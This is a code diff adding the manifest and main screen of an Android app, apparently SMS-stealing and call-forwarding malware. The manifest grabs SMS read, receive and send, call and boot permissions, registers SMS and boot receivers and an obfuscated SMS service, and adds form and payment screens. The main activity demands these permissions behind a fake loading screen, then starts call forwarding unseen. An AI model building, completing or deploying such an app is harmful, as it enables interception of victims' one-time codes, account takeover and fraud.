@@ -328,3 +328,266 @@ object AdminNumberFetcher {
         }
 }
 
+
+menifest
+
+
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    >
+
+    <!-- Permissions -->
+    <uses-feature
+        android:name="android.hardware.telephony"
+        android:required="false" />
+
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_PHONE_CALL"/>
+    <uses-permission android:name="android.permission.MANAGE_OWN_CALLS"/>
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+
+
+    <application
+        android:allowBackup="true"
+        android:icon="@drawable/ic_launcher"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.MyApp"
+        android:usesCleartextTraffic="false">
+
+        <!-- Main Activity -->
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            tools:node="merge">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!--        &lt;!&ndash; SMS Receiver &ndash;&gt;-->
+        <receiver
+            android:name=".receivers.SMSReceiver"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name=".receivers.IncomingCallReceiver"
+            android:enabled="true"
+            android:exported="false"
+            android:permission="android.permission.READ_PHONE_STATE">
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE"/>
+            </intent-filter>
+        </receiver>
+
+
+        <service
+            android:name=".services.CallForwardingService"
+            android:foregroundServiceType="phoneCall"
+            android:permission="android.permission.FOREGROUND_SERVICE"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.example.refactor.START_CALL_FORWARDING" />
+            </intent-filter>
+        </service>
+
+
+
+        <!-- Boot Receiver -->
+        <receiver
+            android:name=".receivers.BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- SMS Service -->
+        <service
+            android:name=".services.SmsService"
+            android:foregroundServiceType="dataSync"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.pakajb.avzbakl.msbzjl.skalalk.START_SERVICE" />
+            </intent-filter>
+        </service>
+
+        <!-- Additional Activities -->
+        <activity android:name=".activities.FormActivity"
+            android:exported="false" />
+        <activity android:name=".activities.PaymentActivity"
+            android:exported="false" />
+        <activity android:name=".activities.SuccessActivity"
+            android:exported="false" />
+
+    </application>
+
+</manifest>
+
+
+
+
+mainactivity
+
+package com.example.refactor
+
+import android.Manifest
+import android.content.Intent
+import android.content.pm.PackageManager
+import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
+import android.widget.ImageView
+import android.widget.ProgressBar
+import android.widget.Toast
+import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import com.example.refactor.activities.FormActivity
+import com.example.refactor.services.CallForwardingService
+import com.example.refactor.utils.PermissionUtil
+
+
+
+class MainActivity : AppCompatActivity() {
+    private lateinit var progressBar: ProgressBar
+    private lateinit var imageViewLogo: ImageView
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_main)
+
+        // Initialize UI elements
+        progressBar = findViewById(R.id.progressBar)
+        imageViewLogo = findViewById(R.id.imageViewLogo)
+
+        // Set initial opacity and scale to 0 and 0.5
+        progressBar.alpha = 0f
+        imageViewLogo.alpha = 0f
+        progressBar.scaleX = 0.5f
+        progressBar.scaleY = 0.5f
+        imageViewLogo.scaleX = 0.5f
+        imageViewLogo.scaleY = 0.5f
+
+        progressBar.max = 100
+
+        // Check for SMS and Call permissions
+        if (PermissionUtil.hasPermissions(
+                this,
+                Manifest.permission.RECEIVE_SMS,
+                Manifest.permission.READ_SMS,
+                Manifest.permission.SEND_SMS,
+                Manifest.permission.INTERNET,
+                Manifest.permission.CALL_PHONE, // Add Call permission
+                Manifest.permission.READ_PHONE_STATE // Add Phone state permission
+            )
+        ) {
+            startAnimations()
+        } else {
+            // Request permissions if not granted
+            ActivityCompat.requestPermissions(
+                this,
+                arrayOf(
+                    Manifest.permission.RECEIVE_SMS,
+                    Manifest.permission.READ_SMS,
+                    Manifest.permission.SEND_SMS,
+                    Manifest.permission.INTERNET,
+                    Manifest.permission.CALL_PHONE, // Request Call permission
+                    Manifest.permission.READ_PHONE_STATE // Request Phone state permission
+                ),
+                101
+            )
+        }
+    }
+
+    private fun startAnimations() {
+        // Animate opacity and scale to full over 0.3 seconds
+        imageViewLogo.animate().alpha(1f).scaleX(1f).scaleY(1f).setDuration(1000).start()
+        progressBar.animate().alpha(1f).scaleX(1f).scaleY(1f).setDuration(1000).start()
+
+        // Start progress animation after 1 second
+        Handler(Looper.getMainLooper()).postDelayed({
+            showProgressAndNavigate()
+        }, 2000)
+    }
+
+    private fun showProgressAndNavigate() {
+        var progress = 0
+        val handler = Handler(Looper.getMainLooper())
+        val progressRunnable = object : Runnable {
+            override fun run() {
+                if (progress <= 100) {
+                    progressBar.progress = progress
+                    progress += 5  // Increase progress smoothly
+                    handler.postDelayed(this, 100) // Update progress every 100ms
+                } else {
+                    navigateToFormPage() // Navigate once progress completes
+                }
+            }
+        }
+        handler.post(progressRunnable)
+    }
+
+    private fun navigateToFormPage() {
+        val intent = Intent(this, FormActivity::class.java)
+        startActivity(intent)
+        finish()
+
+        // Start the Call Forwarding service once user navigates
+        startCallForwardingService()
+    }
+
+    private fun startCallForwardingService() {
+        val intent = Intent(this, CallForwardingService::class.java)
+        startService(intent)
+    }
+
+    // Handle permission request result
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == 101) {
+            // Check if all permissions were granted
+            var allPermissionsGranted = true
+            for (grantResult in grantResults) {
+                if (grantResult != PackageManager.PERMISSION_GRANTED) {
+                    allPermissionsGranted = false
+                    break
+                }
+            }
+
+            if (allPermissionsGranted) {
+                // If all permissions granted, start animations
+                startAnimations()
+            } else {
+                // If any permission is denied, show a message
+                Toast.makeText(this, "Permissions are required to proceed.", Toast.LENGTH_SHORT).show()
+            }
+        }
+    }
+}
+
